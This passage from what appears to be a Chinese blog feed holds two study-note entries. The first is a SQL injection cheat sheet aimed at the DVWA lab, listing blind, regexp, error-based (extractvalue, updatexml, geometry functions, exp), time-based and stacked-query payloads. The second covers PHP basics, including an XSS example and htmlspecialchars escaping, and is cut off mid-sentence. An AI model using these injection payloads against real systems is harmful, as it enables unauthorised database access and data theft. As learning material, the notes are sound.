class="hljs-number">1</span>,<span class="hljs-number">1</span>)) = <span class="hljs-number">101</span><span class="hljs-comment">--+//获取数据库下的表</span><span class="hljs-string">&#x27; and length((select table_name from information_schema.tables where table_schema=&#x27;</span>dvwa<span class="hljs-string">&#x27; limit 0,1))=9 --+ 查询表的长度</span><span class="hljs-string"></span><span class="hljs-string">&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=(<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">column_name</span> regexp <span class="hljs-string">&#x27;^us[a-z]&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)<span class="hljs-comment">--+//获取表里的列名</span><span class="hljs-string">&#x27; and length((select column_name from information_schema.columns where table_schema=database() and table_name=&quot;users&quot;limit 0,1))&gt;1 --+ //查询列的长度</span><span class="hljs-string"></span><span class="hljs-string">&#x27;</span> <span class="hljs-keyword">and</span> ord(mid((<span class="hljs-keyword">select</span> ifnull(cast(username <span class="hljs-keyword">as</span> <span class="hljs-type">char</span>),x（错误返回值）)<span class="hljs-keyword">from</span> <span class="hljs-keyword">security</span>.users <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> id <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">68</span><span class="hljs-comment">--+ //获取列的内容</span></code></pre><h4 id="regexp正则注入"><a class="header-anchor" href="#regexp正则注入">🍭</a>regexp正则注入</h4><pre><code class="hljs pgsql"><span class="hljs-string">&#x27; and 1=(user() regexpri&#x27;</span>^<span class="hljs-string">&#x27;) --+//查看当前操作的用户</span><span class="hljs-string"> </span><span class="hljs-string">&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=(<span class="hljs-keyword">database</span>() regexp<span class="hljs-string">&#x27;^s&#x27;</span>) <span class="hljs-comment">--+//查看当前数据库</span><span class="hljs-string">&#x27; and ((select schema_name from information_schema.schemata limit 0,1) regexp&#x27;</span>^i[a-z]<span class="hljs-string">&#x27; )=1 --+//正则猜测第一个数据库的名字</span><span class="hljs-string"> </span><span class="hljs-string">&#x27;</span> <span class="hljs-keyword">and</span> ((<span class="hljs-keyword">select</span> <span class="hljs-built_in">table_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;dvwa&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)regexp <span class="hljs-string">&#x27;^g[a-z]&#x27;</span> )=<span class="hljs-number">1</span> <span class="hljs-comment">--+//正则猜测dvwa数据库里第一个表的名字</span> <span class="hljs-string">&#x27; and ((select column_name from information_schema.columns where table_schema=&#x27;</span>dvwa<span class="hljs-string">&#x27; and table_name=&#x27;</span>users<span class="hljs-string">&#x27; limit 0,1) regexp &#x27;</span>^u[a-z]<span class="hljs-string">&#x27; )=1 --+//正则猜测dvwa数据库里的users表里的第一个值</span><span class="hljs-string"> </span><span class="hljs-string">&#x27;</span> <span class="hljs-keyword">and</span> ((<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> dvwa.users <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>) regexp <span class="hljs-string">&#x27;^a[a-z]&#x27;</span> )=<span class="hljs-number">1</span> <span class="hljs-comment">--+//正则猜测dvwa数据库里的users表里的user字段里的第一个值</span></code></pre><h4 id="like匹配注入"><a class="header-anchor" href="#like匹配注入">🍭</a>like匹配注入</h4><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>() <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;ro%&#x27;</span></code></pre><h3 id="报错注入"><a class="header-anchor" href="#报错注入">🍭</a>报错注入</h3><h4 id="floor-和rand"><a class="header-anchor" href="#floor-和rand">🍭</a>floor()和rand()</h4><pre><code class="hljs pgsql"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> count(*),<span class="hljs-number">2</span>,concat(<span class="hljs-string">&#x27;:&#x27;</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>()),<span class="hljs-string">&#x27;:&#x27;</span>,floor(rand()*<span class="hljs-number">2</span>))<span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a   //利用错误信息得到当前数据库名</code></pre><h4 id="extractvalue"><a class="header-anchor" href="#extractvalue">🍭</a>extractvalue()</h4><pre><code class="hljs apache"><span class="hljs-attribute">id</span>=<span class="hljs-number">1</span> and extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,(select user()),<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e))</code></pre><h4 id="updatexml"><a class="header-anchor" href="#updatexml">🍭</a>updatexml()</h4><pre><code class="hljs apache"><span class="hljs-attribute">id</span>=<span class="hljs-number">1</span> and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,(select user()),<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e),<span class="hljs-number">1</span>)</code></pre><h4 id="geometrycollection"><a class="header-anchor" href="#geometrycollection">🍭</a>geometrycollection()</h4><pre><code class="hljs n1ql">id=1 and geometrycollection((<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b))</code></pre><h4 id="multipoint"><a class="header-anchor" href="#multipoint">🍭</a>multipoint()</h4><pre><code class="hljs n1ql">id=1 and multipoint((<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b))</code></pre><h4 id="polygon"><a class="header-anchor" href="#polygon">🍭</a>polygon()</h4><pre><code class="hljs pgsql">id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> polygon((<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b))</code></pre><h4 id="multipolygon"><a class="header-anchor" href="#multipolygon">🍭</a>multipolygon()</h4><pre><code class="hljs n1ql">id=1 and multipolygon((<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b))</code></pre><h4 id="linestring"><a class="header-anchor" href="#linestring">🍭</a>linestring()</h4><pre><code class="hljs n1ql">id=1 and linestring((<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b))</code></pre><h4 id="multilinestring"><a class="header-anchor" href="#multilinestring">🍭</a>multilinestring()</h4><pre><code class="hljs n1ql">id=1 and multilinestring((<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b))</code></pre><h4 id="exp"><a class="header-anchor" href="#exp">🍭</a>exp()</h4><pre><code class="hljs pgsql">id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> exp(~(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a))</code></pre><h3 id="时间注入"><a class="header-anchor" href="#时间注入">🍭</a>时间注入</h3><pre><code class="hljs apache"><span class="hljs-attribute">If</span>(ascii(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">115</span>,<span class="hljs-number">0</span>,sleep(<span class="hljs-number">5</span>)) --+//如果前面执行的正确执行<span class="hljs-number">0</span>就为假 ,如果前面错误则执行后面sleep(<span class="hljs-number">5</span>)延迟<span class="hljs-number">5</span>秒</code></pre><h3 id="堆叠查询注入"><a class="header-anchor" href="#堆叠查询注入">🍭</a>堆叠查询注入</h3><pre><code class="hljs apache"><span class="hljs-attribute">id</span> = <span class="hljs-number">1</span>&#x27;;select if(sub(user(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)=&#x27;r&#x27;,sleep(<span class="hljs-number">3</span>),<span class="hljs-number">1</span>)%<span class="hljs-number">23</span></code></pre><h3 id="二次注入"><a class="header-anchor" href="#二次注入">🍭</a>二次注入</h3><p><img src="/2020/11/08/SQL/%E5%95%A6%E5%95%A6%E5%95%A6.jpg" alt="啦啦啦"></p><h3 id="宽字节注入"><a class="header-anchor" href="#宽字节注入">🍭</a>宽字节注入</h3><p><img src="/2020/11/08/SQL/%E5%93%88%E5%93%88%E5%93%88.jpg" alt="哈哈哈"></p>]]></content>
    
    
    
    <tags>
      
      <tag>sql</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>php(三)</title>
    <link href="/2020/11/04/php(%E4%B8%89)/"/>
    <url>/2020/11/04/php(%E4%B8%89)/</url>
    
    <content type="html"><![CDATA[<h1>PHP（三）</h1><ul><li><a href="#php%E4%B8%89">PHP（三）</a><ul><li><a href="#php-%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4">PHP 命名空间</a><ul><li><a href="#%E5%AE%9A%E4%B9%89">定义</a></li></ul></li><li><a href="#php%E8%A1%A8%E5%8D%95">php表单</a><ul><li><a href="#php-%E4%B8%8B%E6%8B%89%E8%8F%9C%E5%8D%95%E5%8D%95%E9%80%89">PHP 下拉菜单单选</a></li><li><a href="#php-%E4%B8%8B%E6%8B%89%E8%8F%9C%E5%8D%95%E5%A4%9A%E9%80%89">PHP 下拉菜单多选</a></li></ul></li><li><a href="#php-%E8%A1%A8%E5%8D%95%E9%AA%8C%E8%AF%81">PHP 表单验证</a><ul><li><a href="#php-%E9%AA%8C%E8%AF%81%E8%A1%A8%E5%8D%95%E6%95%B0%E6%8D%AE">PHP 验证表单数据</a></li><li><a href="#php-%E8%A1%A8%E5%8D%95---%E5%BF%85%E9%9C%80%E5%AD%97%E6%AE%B5">PHP 表单 - 必需字段</a></li></ul></li><li><a href="#%E9%AA%8C%E8%AF%81%E9%82%AE%E4%BB%B6%E5%92%8Curl">验证邮件和URL</a><ul><li><a href="#php---%E9%AA%8C%E8%AF%81%E5%90%8D%E7%A7%B0">PHP - 验证名称</a></li></ul></li><li><a href="#php-%E5%A4%9A%E7%BB%B4%E6%95%B0%E7%BB%84">PHP 多维数组</a></li><li><a href="#date-%E5%87%BD%E6%95%B0">date() 函数</a></li><li><a href="#php-%E5%8C%85%E5%90%AB%E6%96%87%E4%BB%B6">PHP 包含文件</a><ul><li><a href="#include-%E5%92%8C-require-%E8%AF%AD%E5%8F%A5">include 和 require 语句:</a></li></ul></li><li><a href="#php-%E6%96%87%E4%BB%B6%E5%A4%84%E7%90%86">PHP 文件处理</a><ul><li><a href="#%E6%89%93%E5%BC%80%E6%96%87%E4%BB%B6">打开文件</a></li><li><a href="#feof-%E5%87%BD%E6%95%B0">feof() 函数</a></li></ul></li><li><a href="#php%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0">PHP文件上传</a><ul><li><a href="#%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%A1%A8%E5%8D%95">创建一个文件上传表单</a></li><li><a href="#%E5%88%9B%E5%BB%BA%E4%B8%8A%E4%BC%A0%E8%84%9A%E6%9C%AC">创建上传脚本</a></li></ul></li><li><a href="#php-cookie">PHP Cookie</a></li><li><a href="#php-session">PHP Session</a></li><li><a href="#php-%E5%8F%91%E9%80%81%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6">PHP 发送电子邮件</a><ul><li><a href="#php-mail-%E5%87%BD%E6%95%B0">PHP mail() 函数</a></li><li><a href="#php-e-mail-%E6%B3%A8%E5%85%A5">PHP E-mail 注入</a></li></ul></li><li><a href="#php-%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86">PHP 错误处理</a><ul><li><a href="#%E4%BD%BF%E7%94%A8-die-%E5%87%BD%E6%95%B0">使用 die() 函数</a></li><li><a href="#%E5%88%9B%E5%BB%BA%E8%87%AA%E5%AE%9A%E4%B9%89%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86%E5%99%A8">创建自定义错误处理器</a></li><li><a href="#%E8%AE%BE%E7%BD%AE%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86%E7%A8%8B%E5%BA%8F">设置错误处理程序</a></li><li><a href="#%E8%A7%A6%E5%8F%91%E9%94%99%E8%AF%AF-trigger_error">触发错误： trigger_error()</a></li><li><a href="#%E9%94%99%E8%AF%AF%E8%AE%B0%E5%BD%95">错误记录</a></li></ul></li><li><a href="#php-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86">PHP 异常处理</a><ul><li><a href="#trythrow-%E5%92%8C-catch">Try、throw 和 catch</a></li><li><a href="#%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E8%87%AA%E5%AE%9A%E4%B9%89%E7%9A%84-exception-%E7%B1%BB%E7%BB%A7%E6%89%BF%E4%BA%86-php-%E7%9A%84-exception-%E7%B1%BB%E7%9A%84%E6%89%80%E6%9C%89%E5%B1%9E%E6%80%A7%E5%8F%AF%E5%90%91%E5%85%B6%E6%B7%BB%E5%8A%A0%E8%87%AA%E5%AE%9A%E4%B9%89%E7%9A%84%E5%87%BD%E6%95%B0">创建一个自定义的 Exception 类（继承了 PHP 的 exception 类的所有属性，可向其添加自定义的函数）</a></li></ul></li><li><a href="#php-%E8%BF%87%E6%BB%A4%E5%99%A8">PHP 过滤器</a><ul><li><a href="#%E9%AA%8C%E8%AF%81%E8%BE%93%E5%85%A5">验证输入</a></li><li><a href="#%E8%BF%87%E6%BB%A4%E5%A4%9A%E4%B8%AA%E8%BE%93%E5%85%A5filter_var_array-%E6%88%96-the-filter_input_array">过滤多个输入：filter_var_array 或 the filter_input_array</a></li><li><a href="#filter-callback">Filter Callback</a></li></ul></li><li><a href="#php-json">PHP JSON</a><ul><li><a href="#json_encode%E7%94%A8%E4%BA%8E%E5%AF%B9%E5%8F%98%E9%87%8F%E8%BF%9B%E8%A1%8C-json-%E7%BC%96%E7%A0%81">json_encode：用于对变量进行 JSON 编码</a></li><li><a href="#%E5%B0%86-php-%E5%AF%B9%E8%B1%A1%E8%BD%AC%E6%8D%A2%E4%B8%BA-json-%E6%A0%BC%E5%BC%8F%E6%95%B0%E6%8D%AE">将 PHP 对象转换为 JSON 格式数据</a></li><li><a href="#json_decode">json_decode</a></li></ul></li></ul></li></ul><h2 id="PHP-命名空间"><a class="header-anchor" href="#PHP-命名空间">🍭</a>PHP 命名空间</h2><h4 id="定义"><a class="header-anchor" href="#定义">🍭</a>定义</h4><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <span class="hljs-comment">// 定义代码在 &#x27;MyProject&#x27; 命名空间中  </span><span class="hljs-keyword">namespace</span> <span class="hljs-title">MyProject</span>;   <span class="hljs-comment">// ... 代码 ...  </span></code></pre><p>可以在同一个文件中定义不同的命名空间代码。全局代码必须用一个不带名称的 namespace 语句加上大括号括起来。 declare 是唯一可以放在命名空间前的语句。所有非 PHP 代码包括空白符都不能出现在命名空间的声明之前。</p><h2 id="php表单"><a class="header-anchor" href="#php表单">🍭</a>php表单</h2><h4 id="PHP-下拉菜单单选"><a class="header-anchor" href="#PHP-下拉菜单单选">🍭</a>PHP 下拉菜单单选</h4><pre><code class="hljs php-template"><span class="php"><span class="hljs-meta">&lt;?php</span></span><span class="php">$q = <span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;q&#x27;</span>])? htmlspecialchars($_GET[<span class="hljs-string">&#x27;q&#x27;</span>]) : <span class="hljs-string">&#x27;&#x27;</span>;</span><span class="php"><span class="hljs-keyword">if</span>($q) &#123;</span><span class="php">        <span class="hljs-keyword">if</span>($q ==<span class="hljs-string">&#x27;JD&#x27;</span>) &#123;</span><span class="php">                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;京东&lt;br&gt;http://www.JD.com&#x27;</span>;</span><span class="php">        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>($q ==<span class="hljs-string">&#x27;baidu&#x27;</span>) &#123;</span><span class="php">                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27; 百度&lt;br&gt;http://www.baidu.com&#x27;</span>;</span><span class="php">        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>($q ==<span class="hljs-string">&#x27;TAOBAO&#x27;</span>) &#123;</span><span class="php">                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;淘宝&lt;br&gt;http://www.taobao.com&#x27;</span>;</span><span class="php">        &#125;</span><span class="php">&#125; <span class="hljs-keyword">else</span> &#123;</span><span class="php"><span class="hljs-meta">?&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;get&quot;</span>&gt;</span> </span><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;q&quot;</span>&gt;</span></span><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span>选择一个站点:<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span></span><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;JD&quot;</span>&gt;</span>JD<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span></span><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;baidu&quot;</span>&gt;</span>baidu<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span></span><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;TAOBAO&quot;</span>&gt;</span>Taobao<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span></span><span class="xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span></span><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;提交&quot;</span>&gt;</span></span><span class="xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><span class="php"><span class="hljs-meta">&lt;?php</span></span><span class="php">&#125;</span><span class="php"><span class="hljs-meta">?&gt;</span></span></code></pre><h4 id="PHP-下拉菜单多选"><a class="header-anchor" href="#PHP-下拉菜单多选">🍭</a>PHP 下拉菜单多选</h4><p>设置 select <strong>name=“q[]”</strong> 以数组的方式获取。</p><p>采用数组arry()函数，其余代码与单选类似：</p><pre><code class="hljs php">$q = <span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;q&#x27;</span>])? $_POST[<span class="hljs-string">&#x27;q&#x27;</span>] : <span class="hljs-string">&#x27;&#x27;</span>;<span class="hljs-keyword">if</span>(is_array($q)) &#123;    $sites = <span class="hljs-keyword">array</span>(            <span class="hljs-string">&#x27;JD&#x27;</span> =&gt; <span class="hljs-string">&#x27;京东: http://www.JD.com&#x27;</span>,            <span class="hljs-string">&#x27;baidu&#x27;</span> =&gt; <span class="hljs-string">&#x27; 百度: http://www.baidu.com&#x27;</span>,            <span class="hljs-string">&#x27;TAOBAO&#x27;</span> =&gt; <span class="hljs-string">&#x27;淘宝: http://www.taobao.com&#x27;</span>,    );    <span class="hljs-keyword">foreach</span>($q <span class="hljs-keyword">as</span> $val) &#123;        <span class="hljs-keyword">echo</span> $sites[$val] . PHP_EOL;</code></pre><p>其中PHP_EOL表示换行。</p><h2 id="PHP-表单验证"><a class="header-anchor" href="#PHP-表单验证">🍭</a>PHP 表单验证</h2><p>$_SERVER[“PHP_SELF”]是超级全局变量，返回当前正在执行脚本的文件名，与 document root相关。<strong>当黑客使用跨网站脚本的HTTP链接来攻击时，该函数服务器变量也会被植入脚本。原因就是跨网站脚本是附在执行文件的路径后面的，因此函数的字符串就会包含HTTP链接后面的JavaScript程序代码。</strong>(XSS又叫 CSS (Cross-Site Script) ,跨站脚本攻击。恶意攻击者往Web页面里插入恶意html代码，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到恶意用户的特殊目的。)</p><p>$_SERVER[“PHP_SELF”] 可以通过 <em><strong>htmlspecialchars()</strong></em> 函数来避免被利用。</p><pre><code class="hljs xml">&amp; （和号） 成为 <span class="hljs-symbol">&amp;amp;</span>&quot; （双引号） 成为 <span class="hljs-symbol">&amp;quot;</span>&#x27; （单引号） 成为 <span class="hljs-symbol">&amp;#039;</span><span class="hljs-tag">&lt; （小于） 成为 &amp;<span class="hljs-attr">lt</span>;</span><span class="hljs-tag">&gt;</span> （大于） 成为 <span class="hljs-symbol">&amp;gt;</span></code></pre><p>正常代码如下：</p><pre><code class="hljs php-template"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;</span></span></span><span class="php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> htmlspecialchars($_SERVER[<span class="hljs-string">&quot;PHP_SELF&quot;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>&gt;</span></span></code></pre><p>htmlspecialchars() 把一些预定义的字符转换为 HTML 实体。可避免该函数被利用。</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;test_form.php/<span class="hljs-symbol">&amp;quot;</span><span class="hljs-symbol">&amp;gt;</span><span class="hljs-symbol">&amp;lt;</span>script<span class="hljs-symbol">&amp;gt;</span>alert(&#x27;hacked&#x27;)<span class="hljs-symbol">&amp;lt;</span>/script<span class="hljs-symbol">&amp;gt;</span>&quot;</span>&gt;</span></code></pre><h4 id="PHP-验证表单数据"><a class="header-anchor" href="#PHP-验证表单数据">🍭</a>PHP 验证表单数据</h4><p>用户提交的数据通过 PHP 的 htmlspecialchars() 函数处理，代码将不会被执行，而会被保存为HTML转义代码。</p><p>实例：</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">location.href(<span class="hljs-string">&#x27;http://www.JD.com&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre><p>处理后：</p><pre><code class="hljs gams">&amp;<span class="hljs-keyword">lt</span>;script&amp;<span class="hljs-keyword">gt</span>;location.href(<span class="hljs-string">&#x27;http://www.JD.com&#x27;</span>)&amp;<span class="hljs-keyword">lt</span>;/script&amp;<span class="hljs-keyword">gt</span>;</code></pre><h4 id="PHP-表单-必需字段"><a class="header-anchor" href="#PHP-表单-必需字段">🍭</a>PHP 表单 - 必需字段</h4><p>$nameErr, $emailErr, $genderErr, 和 $websiteErr.这些错误变量显示在必需字段上，在每个$_POST变量中增加了一个if else语句以检查 变量是 否为空（使用empty() 函数）如果为空，将显示对应的错误信息；如果不为空，数据将传递给test_input() 函数。</p><h2 id="验证邮件和URL"><a class="header-anchor" href="#验证邮件和URL">🍭</a>验证邮件和URL</h2><p><strong>int preg_match ( string $pattern , string $subject [, array $matches [, int $flags ]] )</strong></p><p>在 subject 字符串中搜索与 pattern 给出的正则表达式相匹配的内容。如果提供了 matches ，则其会被搜索的结果所填充。$matches[0] 将包含与整个模式匹配的文本，$matches[1] 将包含与第一个捕获的括号中的子模式所匹配的文本，以此类推。</p><h4 id="PHP-验证名称"><a class="header-anchor" href="#PHP-验证名称">🍭</a>PHP - 验证名称</h4><pre><code class="hljs powershell"><span class="hljs-variable">$name</span> = test_input(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;name&quot;</span>]);<span class="hljs-keyword">if</span> (!preg_match(<span class="hljs-string">&quot;/^[a-zA-Z ]*<span class="hljs-variable">$</span>/&quot;</span>,<span class="hljs-variable">$name</span>)) &#123;  <span class="hljs-variable">$nameErr</span> = <span class="hljs-string">&quot;只允许字母和空格&quot;</span>; &#125;</code></pre><p>URL,E-mail,与上面类似；将preg_match括号中替换成<code>(&quot;/\b(?:(?:https?|ftp):\/\/|www\.)[-a-z0-9+&amp;@#\/%?=~_|!:,.;]*[-a-z0-9+&amp;@#\/%=~_|]/i&quot;,$website),(&quot;/([\w\-]+\@[\w\-]+\.[\w\-]+)/&quot;,$email)</code>即可。</p><h2 id="PHP-多维数组"><a class="header-anchor" href="#PHP-多维数组">🍭</a>PHP 多维数组</h2><p>包含一个或多个数组的数组，在多维数组中，主数组中的每一个元素也可以是一个数组，子数组中的每一个元素也可以是一个数组。</p><pre><code class="hljs php-template"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">pre</span>&gt;</span></span><span class="php"><span class="hljs-meta">&lt;?php</span></span><span class="php"><span class="hljs-comment">// 二维数组:</span></span><span class="php">$cosmetic = <span class="hljs-keyword">array</span></span><span class="php">(</span><span class="php">    <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;YSL&quot;</span>,<span class="hljs-string">&quot;Dior&quot;</span>,<span class="hljs-string">&quot;CHANEL&quot;</span>),</span><span class="php">    <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;GUCCI&quot;</span>,<span class="hljs-string">&quot;Lancome&quot;</span>,<span class="hljs-string">&quot;Guerlain&quot;</span>),</span><span class="php">    <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;HERMES&quot;</span>,<span class="hljs-string">&quot;La_Mer&quot;</span>,<span class="hljs-string">&quot;DAVIDOFF&quot;</span>)</span><span class="php">);</span><span class="php">print_r($cosmetic);</span><span class="php"><span class="hljs-meta">?&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">pre</span>&gt;</span></span></code></pre><p>结果如下：</p><pre><code class="hljs livescript"><span class="hljs-built_in">Array</span>(    [<span class="hljs-number">0</span>] =&gt; <span class="hljs-built_in">Array</span>        (            [<span class="hljs-number">0</span>] =&gt; YSL            [<span class="hljs-number">1</span>] =&gt; Dior            [<span class="hljs-number">2</span>] =&gt; CHANEL        )    [<span class="hljs-number">1</span>] =&gt; <span class="hljs-built_in">Array</span>        (            [<span class="hljs-number">0</span>] =&gt; GUCCI            [<span class="hljs-number">1</span>] =&gt; Lancome            [<span class="hljs-number">2</span>] =&gt; Guerlain        )    [<span class="hljs-number">2</span>] =&gt; <span class="hljs-built_in">Array</span>        (            [<span class="hljs-number">0</span>] =&gt; HERMES            [<span class="hljs-number">1</span>] =&gt; La_Mer            [<span class="hljs-number">2</span>] =&gt; DAVIDOFF        ))</code></pre><h2 id="date-函数"><a class="header-anchor" href="#date-函数">🍭</a>date() 函数</h2><p>把时间戳（字符序列，表示一定的事件发生的日期/时间）格式化为可读性更好的日期和时间。</p><p>语法如下：</p><pre><code class="hljs mel"><span class="hljs-keyword">string</span> <span class="hljs-keyword">date</span> ( <span class="hljs-keyword">string</span> $format [, <span class="hljs-keyword">int</span> $timestamp ] )</code></pre><ul><li>d - 代表月中的天</li><li>m - 代表月</li><li>Y - 代表年</li></ul><p>格式如下：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">echo</span> date(<span class="hljs-string">&quot;Y/m/d&quot;</span>) . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<span class="hljs-keyword">echo</span> date(<span class="hljs-string">&quot;Y.m.d&quot;</span>) . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<span class="hljs-keyword">echo</span> date(<span class="hljs-string">&quot;Y-m-d&quot;</span>);<span class="hljs-meta">?&gt;</span></code></pre><p>输出如下:</p><pre><code class="hljs angelscript"><span class="hljs-number">2020</span>/<span class="hljs-number">10</span>/<span class="hljs-number">19</span><span class="hljs-number">2020.10</span><span class="hljs-number">.19</span><span class="hljs-number">2020</span><span class="hljs-number">-10</span><span class="hljs-number">-19</span></code></pre><p>完整的 PHP Date 参考手册可访问菜鸟教程https://www.runoob.com/php/php-ref-date.html</p><h2 id="PHP-包含文件"><a class="header-anchor" href="#PHP-包含文件">🍭</a>PHP 包含文件</h2><h4 id="include-和-require-语句"><a class="header-anchor" href="#include-和-require-语句">🍭</a>include 和 require 语句:</h4><p>在执行流中插入写在其他文件中的有用的代码。</p><p><strong>include 和 require 除了处理错误的方式不同之外，在其他方面都是相同的：</strong></p><ul><li>require 